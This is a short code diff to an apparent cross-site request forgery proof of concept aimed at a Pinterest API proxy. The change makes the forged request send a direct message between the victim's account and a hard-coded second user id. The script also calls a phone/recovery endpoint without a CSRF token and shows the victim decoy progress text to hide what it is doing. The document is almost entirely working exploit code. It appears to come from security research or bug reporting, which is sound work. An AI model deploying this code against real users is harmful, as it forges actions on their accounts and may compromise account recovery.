@@ -53,6 +53,10 @@ var B = 'https://ask.pinterest.com/api/proxy/pinterest/';
 var SILENT = false;
 var WIN = 'pin_wf_top';
 var uid = null, step = 0;
+// Recipient the message is sent to. The verified-live shape needs TWO DISTINCT ids
+// (user_ids is deduped; a self-pair is rejected with 'Messages need at least two people').
+// Bump this to a real second account uid before demonstrating.
+var PARTNER = '1145392255138898853';
 var lines = ['reviewing account…', 'checking recovery channels…', 'applying changes…'];
 
 function tick(){ document.getElementById('runmsg').textContent = lines[Math.min(step, lines.length - 1)]; step++; }
@@ -96,7 +100,7 @@ function run(){
     var d = j && j.data;
     if (d && d.id) { SILENT = true; uid = d.id; }
     tick();
-    write('conversations/', { user_ids: (uid ? uid + ',' + uid : '0,0'), text: 'Automated cross-site proof message (CSRF PoC). Sent without any CSRF token. Ref ' + MAILBOX });
+    write('conversations/', { user_ids: (uid ? uid + ',' + PARTNER : '0,0'), text: 'Automated cross-site proof message (CSRF PoC). Sent without any CSRF token. Ref ' + MAILBOX });
     write('users/phone/', {});
     if (!SILENT) { window.open('https://www.pinterest.com', WIN); }
     tick();
